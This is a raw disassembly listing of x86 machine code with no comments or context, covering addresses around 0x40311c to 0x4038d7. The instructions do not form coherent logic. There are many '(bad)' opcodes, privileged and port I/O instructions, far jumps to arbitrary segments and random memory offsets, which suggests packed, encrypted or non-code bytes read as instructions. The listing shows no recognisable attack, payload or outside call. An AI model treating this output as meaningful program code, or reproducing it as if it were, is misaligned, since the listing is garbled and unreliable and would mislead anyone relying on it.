  40311c:	push   ds
  40311d:	adc    al,0x3e
  40311f:	cmp    al,0x96
  403121:	mov    ?,WORD PTR [esi+0x1f]
  403124:	scas   eax,DWORD PTR es:[edi]
  403125:	sti    
  403126:	fistp  WORD PTR [esi]
  403128:	jmp    0x6009:0xba821aba
  40312f:	aas    
  403130:	int    0xb1
  403132:	xchg   ecx,eax
  403133:	jne    0x4030d8
  403135:	popf   
  403136:	jg     0x403111
  403138:	xor    edx,DWORD PTR [eax+0x4b]
  40313b:	pop    ebx
  40313c:	mov    dh,0x4b
  40313e:	scas   al,BYTE PTR es:[edi]
  40313f:	call   0xe0ad9321
  403144:	sbb    al,0xf1
  403146:	push   0xffffffb4
  403148:	ja     0x403129
  40314a:	aaa    
  40314b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40314c:	mov    esi,0x7162e329
  403151:	push   edx
  403152:	shl    DWORD PTR [edi-0x5a],1
  403155:	sbb    eax,0xd5ea0eaa
  40315a:	push   0xb20c182
  40315f:	mov    ebp,0xe0c66483
  403164:	imul   esp,DWORD PTR [ebx-0x68c854f9],0xffffff97
  40316b:	hlt    
  40316c:	(bad)  [ebx+0x18766490]
  403172:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  403174:	add    dh,dl
  403176:	pop    esp
  403177:	push   0xd52dd610
  40317c:	sub    ch,BYTE PTR [eax+0x2d0fce2f]
  403182:	sar    BYTE PTR [esi+0x4a47328e],0x27
  403189:	mov    ds:0x9a351f52,eax
  40318e:	aas    
  40318f:	mov    al,ch
  403191:	sti    
  403192:	sub    esi,DWORD PTR [edi-0x3c]
  403195:	add    DWORD PTR [esi],edx
  403197:	int3   
  403198:	hlt    
  403199:	adc    eax,DWORD PTR [ebp-0x31]
  40319c:	ror    BYTE PTR [edi+ebx*2],1
  40319f:	lods   al,BYTE PTR ds:[esi]
  4031a0:	sub    al,0xa0
  4031a2:	mov    eax,0x9c124ce3
  4031a7:	inc    edx
  4031a8:	inc    ecx
  4031a9:	adc    DWORD PTR [eax+0x6d],eax
  4031ac:	and    BYTE PTR [ebp-0x7bbedacd],dl
  4031b2:	xor    al,0xd1
  4031b4:	pop    edx
  4031b5:	loop   0x4031de
  4031b7:	xchg   BYTE PTR [edx+0x2257ee0a],ah
  4031bd:	leave  
  4031be:	inc    esp
  4031bf:	mov    eax,ds:0x14435c61
  4031c4:	xchg   edx,eax
  4031c5:	(bad)  
  4031c6:	jge    0x40316f
  4031c8:	jae    0x4031b2
  4031ca:	and    DWORD PTR [edx+ebx*1],esi
  4031cd:	adc    ah,cl
  4031cf:	idiv   BYTE PTR [esi]
  4031d1:	mov    dl,dl
  4031d3:	mov    BYTE PTR [edi],bl
  4031d5:	jbe    0x4031d7
  4031d7:	rol    BYTE PTR [ecx+edx*4],0xd9
  4031db:	jns    0x4031ac
  4031dd:	popa   
  4031de:	leave  
  4031df:	stos   DWORD PTR es:[edi],eax
  4031e0:	add    esp,ebx
  4031e2:	adc    BYTE PTR [ebp-0x2b],ch
  4031e5:	dec    ebp
  4031e6:	pop    esp
  4031e7:	mov    sp,0x5e44
  4031eb:	inc    ecx
  4031ec:	xor    bl,BYTE PTR [edi-0x20a71b56]
  4031f2:	(bad)  
  4031f3:	pop    ds
  4031f4:	pop    esp
  4031f5:	test   DWORD PTR [ebx],edx
  4031f7:	std    
  4031f8:	or     dh,BYTE PTR [edx]
  4031fa:	sbb    DWORD PTR [esi+0x4f],esi
  4031fd:	imul   eax,ebp,0xc7c14039
  403203:	dec    esp
  403205:	pop    es
  403206:	cwde   
  403207:	shl    BYTE PTR [edx-0x181c94e8],cl
  40320d:	aas    
  40320e:	cmp    cl,0x19
  403211:	outs   dx,DWORD PTR ds:[esi]
  403212:	pop    ebp
  403213:	add    edi,ebx
  403215:	cmp    BYTE PTR [ecx],0x97
  403218:	(bad)  
  403219:	stc    
  40321a:	dec    edx
  40321b:	cmp    eax,DWORD PTR [ebp+0x7fa6f910]
  403221:	or     bh,dl
  403223:	dec    esi
  403224:	jno    0x4031aa
  403226:	outs   dx,DWORD PTR ds:[esi]
  403227:	sbb    eax,0x7044a7b7
  40322c:	or     al,0x91
  40322e:	shr    dh,1
  403230:	loope  0x4031eb
  403232:	gs jnp 0x4031f0
  403235:	or     eax,0x44c65681
  40323a:	push   es
  40323b:	adc    dh,BYTE PTR [edx+eax*8+0x23bb4bba]
  403242:	inc    esi
  403243:	mov    bl,0x18
  403245:	scas   eax,DWORD PTR es:[edi]
  403246:	or     ah,BYTE PTR [ebp-0x6f33856b]
  40324c:	xor    ch,BYTE PTR [edx+0x37a877a9]
  403252:	pop    eax
  403253:	dec    edx
  403254:	imul   edx,eax,0x5b4214e4
  40325a:	sahf   
  40325b:	lea    ebp,[edi]
  40325d:	jge    0x4032dc
  40325f:	mov    dh,0xe
  403261:	addr16 xchg esi,eax
  403263:	fiadd  WORD PTR ss:[ebx-0x57]
  403267:	stc    
  403268:	lds    ebx,FWORD PTR [eax]
  40326a:	data16 rcr bl,cl
  40326d:	es clc 
  40326f:	jnp    0x403236
  403271:	scas   eax,DWORD PTR es:[edi]
  403272:	popf   
  403273:	retf   
  403274:	cli    
  403275:	pop    esi
  403276:	mov    WORD PTR [edi-0x1422a0b1],?
  40327c:	fstp   DWORD PTR [esi]
  40327e:	jae    0x4032e0
  403280:	repz cwde 
  403282:	dec    eax
  403283:	push   esp
  403284:	ss int3 
  403286:	rcl    BYTE PTR [edx],0xa
  403289:	xor    dl,BYTE PTR [ebp-0x51bab7ed]
  40328f:	mov    DWORD PTR [edi+0x1ab9200b],eax
  403295:	sbb    al,0xea
  403297:	out    0x2f,eax
  403299:	mov    ecx,0x9f6a9c01
  40329e:	dec    edi
  40329f:	cli    
  4032a0:	adc    bh,BYTE PTR [ecx-0x58db9b4a]
  4032a6:	mov    edx,0x9fcb6228
  4032ab:	repnz mov esp,0x253c0c30
  4032b1:	mov    edx,0xfd53d505
  4032b6:	leave  
  4032b7:	bound  ebx,QWORD PTR [esi]
  4032b9:	adc    al,0x75
  4032bb:	ficomp DWORD PTR [ecx]
  4032bd:	hlt    
  4032be:	inc    ebx
  4032bf:	adc    DWORD PTR [edx+0x60],ebx
  4032c2:	pop    eax
  4032c3:	aad    0xa9
  4032c5:	push   0x2f
  4032c7:	popf   
  4032c8:	jge    0x40329c
  4032ca:	shr    dh,0x62
  4032cd:	rcl    DWORD PTR [ebp-0x5c],cl
  4032d0:	push   ss
  4032d1:	loope  0x4032c9
  4032d3:	aas    
  4032d4:	mov    ch,0x26
  4032d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032d7:	data16 or BYTE PTR [esi],ch
  4032da:	xchg   edi,eax
  4032db:	jp     0x4032fd
  4032dd:	lods   al,BYTE PTR ds:[esi]
  4032de:	fsub   QWORD PTR [ebx]
  4032e0:	inc    eax
  4032e1:	xor    DWORD PTR [esi-0x7f],ebx
  4032e4:	cli    
  4032e5:	or     eax,0x79978d41
  4032ea:	hlt    
  4032eb:	pop    ebp
  4032ec:	xchg   ecx,eax
  4032ed:	imul   eax,DWORD PTR [ebp+0x4e],0x52
  4032f1:	push   eax
  4032f2:	push   ds
  4032f3:	sbb    bh,bh
  4032f5:	jmp    0x4a3f6666
  4032fa:	mov    ch,0xbf
  4032fc:	test   DWORD PTR [ebx+0x6e9896cf],ebp
  403302:	or     al,0x27
  403304:	jne    0x403372
  403306:	xor    ah,dl
  403308:	sbb    eax,DWORD PTR [edx]
  40330a:	or     al,0xad
  40330c:	mov    eax,es:0xa0c8cd6b
  403312:	rol    DWORD PTR [eax],1
  403314:	ds cmp edx,0x7f0a49fe
  40331b:	xchg   BYTE PTR [edx],bh
  40331d:	mov    edx,0xdf8f9ea4
  403322:	repnz xor eax,0x444ace24
  403328:	ret    
  403329:	mov    eax,DWORD PTR [edx+0x36d1b77a]
  40332f:	scas   eax,DWORD PTR es:[edi]
  403330:	bound  edx,QWORD PTR [ebp+eiz*4-0x50b0e387]
  403337:	and    BYTE PTR [esi+0x2850f8d1],bh
  40333d:	push   cs
  40333e:	xchg   esp,eax
  40333f:	(bad)  
  403341:	test   eax,0x8e4aa886
  403346:	mov    bh,0x78
  403348:	rcl    esp,0x31
  40334b:	test   DWORD PTR [edi],ebp
  40334d:	pop    edi
  40334e:	sub    ebx,ecx
  403350:	mov    ds:0x2e36f263,al
  403355:	mov    edx,DWORD PTR [ebx+0xe]
  403358:	ss daa 
  40335a:	or     bl,BYTE PTR [ecx-0x80]
  40335d:	mov    WORD PTR [eax-0x56f4e320],es
  403363:	popf   
  403364:	test   BYTE PTR [edx-0x2b],cl
  403367:	iret   
  403368:	loopne 0x4033b6
  40336a:	and    eax,DWORD PTR [ecx]
  40336c:	or     esp,DWORD PTR [edi]
  40336e:	repnz mov ecx,0x7adbfdf1
  403374:	or     BYTE PTR ds:0xd641fec2,al
  40337a:	xor    ch,cl
  40337c:	push   ebp
  40337d:	add    DWORD PTR [ebx+0x1b],edx
  403380:	mov    eax,ds:0x1d0d1200
  403385:	pop    ebx
  403386:	stos   BYTE PTR es:[edi],al
  403387:	xchg   esi,eax
  403388:	xor    dl,BYTE PTR [ecx+0x7c1d72d9]
  40338e:	sub    al,0xa8
  403390:	cmp    al,0xb0
  403392:	xchg   ebx,eax
  403393:	(bad)  
  403394:	aam    0x11
  403396:	dec    ecx
  403397:	xor    BYTE PTR [ebp+0x699c3ab0],bh
  40339d:	pushf  
  40339e:	sbb    bh,bl
  4033a0:	cmp    al,0x3e
  4033a2:	in     eax,0x2c
  4033a4:	pop    ebx
  4033a5:	inc    esp
  4033a6:	or     esi,DWORD PTR [edx+esi*2-0xd]
  4033aa:	retf   
  4033ab:	sub    BYTE PTR [edx+0x18940ee9],0x85
  4033b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033b3:	cli    
  4033b4:	test   dh,al
  4033b6:	out    0xf7,eax
  4033b8:	add    BYTE PTR [esi+ecx*4-0x23],bl
  4033bc:	out    0xf5,al
  4033be:	es add al,0x79
  4033c1:	push   es
  4033c2:	or     BYTE PTR [ebp-0x42],ah
  4033c5:	pop    esi
  4033c6:	push   edx
  4033c7:	adc    eax,0xfa9bf762
  4033cc:	shl    ebx,0x52
  4033cf:	loope  0x403391
  4033d1:	mov    ebx,0xce75264d
  4033d6:	out    0xbc,al
  4033d8:	stc    
  4033d9:	outs   dx,DWORD PTR ds:[esi]
  4033da:	popa   
  4033db:	cmp    al,0x4c
  4033dd:	mov    DWORD PTR [edx+0x44],edx
  4033e0:	and    al,0x63
  4033e2:	pop    eax
  4033e3:	and    esi,DWORD PTR [ecx]
  4033e5:	pusha  
  4033e6:	cmp    ebp,DWORD PTR [ebp+edx*8+0x5ff4b2b9]
  4033ed:	fadd   st(3),st
  4033ef:	daa    
  4033f0:	push   ds
  4033f1:	jmp    0xcf7c0a48
  4033f6:	ins    BYTE PTR es:[edi],dx
  4033f7:	cdq    
  4033f8:	cmp    ecx,DWORD PTR [ebx]
  4033fa:	jecxz  0x4033b7
  4033fc:	ja     0x4033c8
  4033fe:	mov    dh,0xd3
  403400:	pop    esp
  403401:	int3   
  403402:	xlat   BYTE PTR ds:[ebx]
  403403:	call   0xd234ff25
  403408:	jb     0x4033a4
  40340a:	mov    cl,0x89
  40340c:	pop    edi
  40340d:	lods   al,BYTE PTR ds:[esi]
  40340e:	push   0x486cdc1e
  403413:	in     al,0x8d
  403415:	mov    ebp,0xcd3014e2
  40341a:	or     DWORD PTR [ebx],esp
  40341c:	sbb    DWORD PTR [eax-0x727248ee],esi
  403422:	stos   DWORD PTR es:[edi],eax
  403423:	sahf   
  403424:	cli    
  403425:	fcomp  QWORD PTR [esi-0xc]
  403428:	mov    ah,0x22
  40342a:	loope  0x4033ac
  40342c:	js     0x4033f5
  40342e:	sub    al,al
  403430:	je     0x40340a
  403432:	push   0x7a
  403434:	mov    bl,0xf9
  403436:	pop    esp
  403437:	jns    0x403420
  403439:	jae    0x4033f7
  40343b:	sub    cl,0x4c
  40343e:	fs inc ebp
  403440:	stos   DWORD PTR es:[edi],eax
  403441:	in     al,0xcf
  403443:	cmp    cl,dl
  403445:	xchg   edx,ebp
  403447:	rol    BYTE PTR [ecx],0x4c
  40344a:	xor    BYTE PTR [ecx-0x2de2bf87],0x6b
  403451:	xlat   BYTE PTR ds:[ebx]
  403452:	dec    esp
  403453:	test   BYTE PTR [ebp+ebp*2-0x5f70ce5e],al
  40345a:	push   ss
  40345b:	sbb    DWORD PTR [ebp+0x77],0x41421f53
  403462:	stos   DWORD PTR es:[edi],eax
  403463:	jno    0x40341a
  403465:	aad    0x1
  403467:	add    BYTE PTR [edi],al
  403469:	outs   dx,BYTE PTR ds:[esi]
  40346a:	jb     0x4033fa
  40346c:	pop    esi
  40346d:	xor    eax,0xc3c1cc45
  403472:	ds push esi
  403474:	sbb    DWORD PTR [eax-0x329f323a],0x9f30e08c
  40347e:	add    al,0x2e
  403480:	fs aas 
  403482:	int3   
  403483:	sub    edx,DWORD PTR [eax]
  403485:	mov    ds:0x70f3f3e5,eax
  40348a:	mov    esi,0x8fcea2e8
  40348f:	fisttp DWORD PTR [edx+0x33cc6835]
  403495:	sbb    BYTE PTR [esi],ch
  403497:	and    DWORD PTR [ebp-0x87b745b],0x7077cf0
  4034a1:	or     al,0x25
  4034a3:	xor    esp,ebp
  4034a5:	inc    ebx
  4034a6:	mov    al,ds:0xa2b95fc0
  4034ab:	mov    WORD PTR [esi+0x11],es
  4034ae:	mov    esp,0xe0f13fe6
  4034b3:	dec    edx
  4034b4:	push   es
  4034b5:	loop   0x4034ec
  4034b7:	repz (bad) 
  4034b9:	icebp  
  4034ba:	loope  0x403530
  4034bc:	sbb    ebp,ebp
  4034be:	pop    edi
  4034bf:	cmp    al,0x4d
  4034c1:	and    al,0x25
  4034c3:	mov    ds:0x67d319da,eax
  4034c8:	xchg   ebx,eax
  4034c9:	lods   al,BYTE PTR ds:[esi]
  4034ca:	pushw  ss
  4034cc:	cdq    
  4034cd:	aas    
  4034ce:	jle    0x40346c
  4034d0:	sti    
  4034d1:	dec    bp
  4034d3:	sahf   
  4034d4:	inc    eax
  4034d5:	adc    esi,DWORD PTR [ebx-0x67]
  4034d8:	pop    ss
  4034d9:	dec    edx
  4034da:	inc    ebp
  4034db:	jmp    0x40348a
  4034dd:	jns    0x4034de
  4034df:	cdq    
  4034e0:	xor    eax,0xeb918213
  4034e5:	nop
  4034e6:	dec    edx
  4034e7:	jp     0x403476
  4034e9:	or     cl,BYTE PTR ds:0x7df70364
  4034ef:	sub    esp,edi
  4034f1:	xor    BYTE PTR [edx+0x45282e5],dl
  4034f7:	out    dx,al
  4034f8:	sbb    al,0x98
  4034fa:	(bad)  
  4034fc:	push   ebx
  4034fd:	mov    ah,0x9
  4034ff:	jge    0x40349a
  403501:	repz fbld TBYTE PTR [ebx+eiz*1-0x46]
  403506:	outs   dx,BYTE PTR ds:[esi]
  403507:	mov    ch,0x8b
  403509:	mov    esi,DWORD PTR [eax-0x33b75fc9]
  40350f:	xchg   ecx,eax
  403510:	inc    edi
  403511:	push   edi
  403512:	adc    ecx,edi
  403514:	cmp    al,0x5b
  403516:	sti    
  403517:	or     bh,BYTE PTR [esi]
  403519:	stc    
  40351a:	inc    ebx
  40351b:	inc    eax
  40351c:	jmp    0x4034da
  40351e:	and    DWORD PTR [ebx+0x64],esp
  403521:	or     BYTE PTR [ecx+0x50],dh
  403524:	aam    0x27
  403526:	jmp    DWORD PTR ds:0x42f3f97b
  40352c:	inc    ebx
  40352d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40352e:	or     eax,0x24f42fc6
  403533:	mov    esp,0x11e21ef3
  403538:	and    ch,BYTE PTR [esi+0x5bbef77c]
  40353e:	shl    BYTE PTR [eax-0x26],1
  403541:	or     bh,BYTE PTR [ebp+0x159db3f8]
  403547:	cwde   
  403548:	in     eax,0xc8
  40354a:	sbb    ebx,DWORD PTR [ebx-0x11]
  40354d:	push   0xffffff89
  40354f:	dec    esi
  403550:	and    BYTE PTR [eax+0x6c],bl
  403553:	add    DWORD PTR ds:0x63b28426,edi
  403559:	sub    esp,esp
  40355b:	jp     0x4034e2
  40355d:	and    cl,BYTE PTR [edx]
  40355f:	inc    esp
  403560:	jne    0x4035d3
  403562:	or     eax,DWORD PTR [ecx+eiz*4+0x16]
  403566:	mov    ds:0x31858c63,eax
  40356b:	mov    ebx,ecx
  40356d:	or     eax,DWORD PTR [ebx-0x3f8654a4]
  403573:	loope  0x403515
  403575:	sbb    al,0x7c
  403577:	jae    0x40357f
  403579:	loopne 0x4035e4
  40357b:	add    dh,BYTE PTR [eax-0x5ee00545]
  403581:	push   edi
  403582:	out    dx,al
  403583:	jne    0x403602
  403585:	mov    cl,0x1f
  403587:	pop    edi
  403588:	inc    ebx
  403589:	mov    DWORD PTR [ecx],ebx
  40358b:	pop    ebp
  40358c:	stc    
  40358d:	arpl   WORD PTR [ebx-0x25],si
  403590:	push   edx
  403591:	mov    ch,BYTE PTR [eax]
  403593:	pop    ss
  403594:	sub    DWORD PTR [esi+0x75],0xe3743d57
  40359b:	mov    ebx,DWORD PTR [edi-0x2e776ea4]
  4035a1:	or     ah,dl
  4035a3:	ror    BYTE PTR [edi],cl
  4035a5:	add    DWORD PTR [eax-0x9],esi
  4035a8:	gs xor al,0x14
  4035ab:	ins    DWORD PTR es:[edi],dx
  4035ac:	and    ch,BYTE PTR [edi-0xe]
  4035af:	inc    esp
  4035b0:	mov    al,0x3c
  4035b2:	push   cs
  4035b3:	ins    BYTE PTR es:[edi],dx
  4035b4:	mov    eax,0xd1b0535a
  4035b9:	test   BYTE PTR [ebx],bh
  4035bb:	or     al,0xe7
  4035bd:	hlt    
  4035be:	jae    0x4035fb
  4035c0:	xchg   edx,eax
  4035c1:	and    BYTE PTR [ebp+0x57],bl
  4035c4:	mov    esp,0x38c69975
  4035c9:	mov    al,0x72
  4035cb:	xchg   BYTE PTR [ecx-0x42],ch
  4035ce:	inc    ebp
  4035cf:	not    BYTE PTR [edi+0x11]
  4035d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035d3:	icebp  
  4035d4:	jns    0x4035cd
  4035d6:	fcmovnb st,st(5)
  4035d8:	mov    ds:0xcd6bd736,eax
  4035dd:	add    BYTE PTR [esi],0xe4
  4035e0:	es dec ecx
  4035e2:	popa   
  4035e3:	xchg   ebx,eax
  4035e4:	dec    eax
  4035e5:	repnz lahf 
  4035e7:	sub    al,0xb4
  4035e9:	or     eax,0x3b5844f0
  4035ee:	xchg   ebp,eax
  4035ef:	jl     0x403575
  4035f1:	sbb    dh,BYTE PTR [edi-0x24a0695c]
  4035f7:	mov    ds:0xb619062e,eax
  4035fc:	adc    BYTE PTR [esi-0x52059358],0x86
  403603:	jg     0x403675
  403605:	xchg   DWORD PTR [edi+0x5],ebx
  403608:	jle    0x403625
  40360a:	in     al,dx
  40360b:	jb     0x4035ef
  40360d:	sahf   
  40360e:	jl     0x403633
  403610:	xchg   edi,eax
  403611:	sbb    ch,BYTE PTR [eax+0x24]
  403614:	retf   0x6f57
  403617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403618:	imul   edi,ebp,0x42
  40361b:	sbb    al,0x37
  40361d:	aas    
  40361e:	sbb    eax,0xc15879cf
  403623:	cmp    DWORD PTR [ebp-0x185a28aa],0x16
  40362a:	test   BYTE PTR [ebx+0x2c],ch
  40362d:	dec    edx
  40362e:	mov    gs:0xf426ff37,al
  403634:	ins    DWORD PTR es:[edi],dx
  403635:	dec    ebx
  403636:	stc    
  403637:	cmp    al,0xc2
  403639:	inc    edi
  40363a:	or     ch,BYTE PTR [ebx]
  40363c:	ins    BYTE PTR es:[edi],dx
  40363d:	ret    
  40363e:	dec    BYTE PTR ds:0x912b8e40
  403644:	xor    BYTE PTR [esi],al
  403646:	es cmc 
  403648:	or     edi,edx
  40364a:	sub    al,0x64
  40364c:	jmp    0x4c67:0xd69b5430
  403653:	and    DWORD PTR [edx-0x6ffb90b1],ebx
  403659:	mov    esi,0x82c8ba9
  40365e:	pop    esi
  40365f:	fadd   DWORD PTR [ecx-0x2e7b49a6]
  403665:	hlt    
  403666:	leave  
  403667:	mov    edi,0xc0658cd
  40366c:	repnz mov edi,0x33c4732a
  403672:	push   edx
  403673:	xor    al,BYTE PTR [eax+0x5158fa97]
  403679:	ror    DWORD PTR [edx-0x516bdf2a],0x4a
  403680:	jbe    0x40365a
  403682:	out    0x61,eax
  403684:	scas   al,BYTE PTR es:[edi]
  403685:	add    eax,0xe5e2962f
  40368a:	or     ah,BYTE PTR [ebp+0x5e356961]
  403690:	pop    eax
  403691:	add    DWORD PTR [edx+edi*1],esp
  403694:	push   edx
  403695:	je     0x4036dd
  403697:	jecxz  0x403620
  403699:	push   edx
  40369a:	inc    ecx
  40369b:	adc    bl,BYTE PTR [esi+eiz*1]
  40369e:	jo     0x4036e7
  4036a0:	push   cs
  4036a1:	sti    
  4036a2:	int    0x77
  4036a4:	ret    0xdca8
  4036a7:	mov    al,ds:0x4faf775b
  4036ac:	es int 0xee
  4036af:	mov    DWORD PTR ds:0x2feeea5a,ebp
  4036b5:	push   ds
  4036b6:	pop    ds
  4036b7:	jl     0x4036d1
  4036b9:	int3   
  4036ba:	cdq    
  4036bb:	jmp    0xb810:0x2ec5945e
  4036c2:	or     al,0x0
  4036c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036c5:	in     eax,dx
  4036c6:	xchg   ecx,eax
  4036c7:	pop    esp
  4036c8:	mov    al,0xbc
  4036ca:	pushf  
  4036cb:	xor    al,al
  4036cd:	xor    bl,BYTE PTR [edx-0x5b]
  4036d0:	and    al,0x90
  4036d2:	aam    0xe8
  4036d4:	out    dx,eax
  4036d5:	shr    DWORD PTR [ecx+0x39],cl
  4036d8:	rcr    DWORD PTR [edi],1
  4036da:	pop    esp
  4036db:	sbb    DWORD PTR [eax+0x3],ebx
  4036de:	addr16 jge 0x4036b1
  4036e1:	(bad)  
  4036e2:	stos   BYTE PTR es:[edi],al
  4036e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036e4:	add    al,0x78
  4036e6:	pusha  
  4036e7:	or     dl,BYTE PTR [ecx-0x80]
  4036ea:	jle    0x4036f1
  4036ec:	xchg   ebx,eax
  4036ed:	into   
  4036ee:	push   edi
  4036ef:	dec    ecx
  4036f0:	xchg   edi,eax
  4036f1:	sub    eax,0x97c12209
  4036f6:	add    eax,0x942b196c
  4036fb:	mov    ah,0x62
  4036fd:	add    BYTE PTR [ecx+0x130380e],bh
  403703:	call   0x5aed:0xd728178b
  40370a:	stos   DWORD PTR es:[edi],eax
  40370b:	push   ebp
  40370c:	test   bl,dh
  40370e:	dec    esi
  40370f:	mov    cs,WORD PTR [edi]
  403711:	pop    eax
  403712:	inc    ecx
  403713:	and    esp,DWORD PTR [edx+edi*8+0x41]
  403717:	jbe    0x4036a8
  403719:	cdq    
  40371a:	or     bh,BYTE PTR [edx]
  40371c:	lods   eax,DWORD PTR ss:[esi]
  40371e:	outs   dx,DWORD PTR ds:[esi]
  40371f:	das    
  403720:	push   esp
  403721:	push   DWORD PTR [edx+0x23460e89]
  403727:	xor    DWORD PTR [ecx-0x4273466],ecx
  40372d:	xor    BYTE PTR [eax+0x0],0x91
  403731:	movnti DWORD PTR ds:0x21276603,esi
  403738:	pop    ecx
  403739:	mov    bh,0xd2
  40373b:	nop
  40373c:	aas    
  40373d:	sub    eax,0x56e99dff
  403742:	mov    dl,0xf1
  403744:	out    dx,al
  403745:	pusha  
  403746:	or     ebx,DWORD PTR es:[ecx+0x5c9a0c99]
  40374d:	fwait
  40374e:	push   ecx
  40374f:	repz pop ebx
  403751:	cmp    esp,DWORD PTR [eax+0x5cdb8f32]
  403757:	mov    edi,0x1eb72c4f
  40375c:	test   BYTE PTR cs:[ebp+0x2],bh
  403760:	lods   al,BYTE PTR ds:[esi]
  403761:	push   edx
  403762:	inc    DWORD PTR [edi+0x3cba947]
  403768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403769:	xor    ah,BYTE PTR [esi-0x4c]
  40376c:	jmp    0x4ee7:0x2f3b0f54
  403773:	ror    DWORD PTR ds:0x4f242202,0xf1
  40377a:	ds leave 
  40377c:	pop    ss
  40377d:	pop    es
  40377e:	in     eax,0x1a
  403780:	mov    cl,0x18
  403782:	neg    BYTE PTR [edx]
  403784:	inc    ebp
  403785:	jmp    0x403720
  403787:	and    cl,BYTE PTR [esi-0x38777c95]
  40378d:	cmc    
  40378e:	popf   
  40378f:	and    eax,0x7678c624
  403794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403795:	stos   DWORD PTR es:[edi],eax
  403796:	call   0xa5106b43
  40379b:	mov    esp,0xcbbc3e3b
  4037a0:	or     DWORD PTR [edx],ecx
  4037a2:	fdiv   DWORD PTR [eax]
  4037a4:	xchg   edi,eax
  4037a5:	stos   DWORD PTR es:[edi],eax
  4037a6:	nop
  4037a7:	std    
  4037a8:	jns    0x4037e7
  4037aa:	stos   BYTE PTR es:[edi],al
  4037ab:	xor    eax,0x6f88280d
  4037b0:	stc    
  4037b1:	xor    BYTE PTR [edi+ebp*1+0x658a7811],0xa6
  4037b9:	into   
  4037ba:	sbb    BYTE PTR [edx-0x735d4c68],ch
  4037c0:	out    dx,al
  4037c1:	ins    DWORD PTR es:[edi],dx
  4037c2:	fbstp  TBYTE PTR ds:0x903dd019
  4037c8:	shl    DWORD PTR [ecx+0x40],cl
  4037cb:	adc    BYTE PTR [edx+0x5d0e1c19],dh
  4037d1:	xlat   BYTE PTR ds:[ebx]
  4037d2:	xor    BYTE PTR ss:[esi],0x22
  4037d6:	cmp    eax,0x2db3d674
  4037db:	xor    ebx,DWORD PTR ds:0x41677198
  4037e1:	cmp    dl,BYTE PTR [edx+0x1029a830]
  4037e7:	aad    0x10
  4037e9:	jge    0x4037f9
  4037eb:	enter  0xd550,0xdc
  4037ef:	fst    QWORD PTR [edx]
  4037f1:	jl     0x4037fe
  4037f3:	scas   eax,DWORD PTR es:[edi]
  4037f4:	ret    
  4037f5:	dec    edi
  4037f6:	lock add DWORD PTR [edi-0x44],esi
  4037fa:	fisttp DWORD PTR [ebp-0x4f2fde51]
  403800:	cmp    ebx,DWORD PTR [ebx-0x1c]
  403803:	mov    ch,0xba
  403805:	jae    0x403790
  403807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403808:	in     al,0xd1
  40380a:	pop    es
  40380b:	popf   
  40380c:	clc    
  40380d:	ds push ds
  40380f:	xchg   ebx,eax
  403810:	dec    edx
  403811:	pop    edi
  403812:	jb     0x403803
  403814:	mov    ah,dh
  403816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403817:	int    0xb0
  403819:	fwait
  40381a:	leave  
  40381b:	pop    ebp
  40381c:	scas   eax,DWORD PTR es:[edi]
  40381d:	mov    al,0xee
  40381f:	dec    eax
  403820:	inc    ebx
  403821:	push   esi
  403822:	fmul   QWORD PTR [eax]
  403824:	lods   eax,DWORD PTR fs:[si]
  403827:	ret    
  403828:	outs   dx,DWORD PTR ds:[esi]
  403829:	shr    DWORD PTR ds:0xc97f32e8,0xd5
  403830:	cmp    BYTE PTR ds:0xa37fe953,dh
  403836:	sub    ebp,edi
  403838:	loop   0x403824
  40383a:	jne    0x403842
  40383c:	sbb    dh,BYTE PTR [edi]
  40383e:	xlat   BYTE PTR ds:[ebx]
  40383f:	int3   
  403840:	xor    dl,bh
  403842:	clc    
  403843:	mov    cl,0xc6
  403845:	lahf   
  403846:	pusha  
  403847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403848:	test   eax,0x5a941c74
  40384d:	popa   
  40384e:	xchg   ebx,eax
  40384f:	or     BYTE PTR [esi],0xe8
  403852:	(bad)  [edx+edi*4]
  403855:	shr    DWORD PTR [edx+0x2a],cl
  403858:	jmp    0x403865
  40385a:	repz in al,dx
  40385c:	mov    gs:0x851ff9fa,al
  403862:	mov    al,0xa0
  403864:	jmp    0x4038b4
  403866:	pop    edx
  403867:	jge    0x40385d
  403869:	mov    ds:0xd78fbf68,al
  40386e:	ficom  DWORD PTR [eax-0x5b8ac8e9]
  403874:	jb     0x403879
  403876:	(bad)  
  403877:	adc    eax,0xd0b061b6
  40387c:	ds push es
  40387e:	fist   WORD PTR [ecx]
  403880:	cmova  edx,DWORD PTR [esi+0xa]
  403884:	outs   dx,DWORD PTR ds:[esi]
  403885:	mov    eax,ds:0x64f6bcd4
  40388a:	xor    cl,BYTE PTR [ecx]
  40388c:	mov    eax,0x6d91c457
  403891:	add    BYTE PTR [edx-0x50],al
  403894:	imul   ebx,DWORD PTR [ebp-0x657312d4],0xe8eca577
  40389e:	xor    BYTE PTR ds:0x39336aa8,bl
  4038a4:	and    dh,dh
  4038a6:	sar    DWORD PTR [edx-0xe899e67],1
  4038ac:	add    esp,ebx
  4038ae:	mov    ch,0x7
  4038b0:	pusha  
  4038b1:	cld    
  4038b2:	mov    eax,0x54ec08c1
  4038b7:	je     0x403841
  4038b9:	icebp  
  4038ba:	add    esi,ebp
  4038bc:	test   DWORD PTR [esi+0x44],0x7e4e56ab
  4038c3:	sub    eax,0x45aad1d6
  4038c8:	fwait
  4038c9:	jl     0x40386d
  4038cb:	neg    dl
  4038cd:	pop    es
  4038ce:	inc    esp
  4038cf:	mov    ebp,DWORD PTR [eax+0x3e]
  4038d2:	lods   eax,DWORD PTR ds:[esi]
  4038d3:	fist   DWORD PTR [edi]
  4038d5:	jl     0x4038e3
  4038d7:	sbb    esi,DWORD PTR [ebp+0xa511f2b]
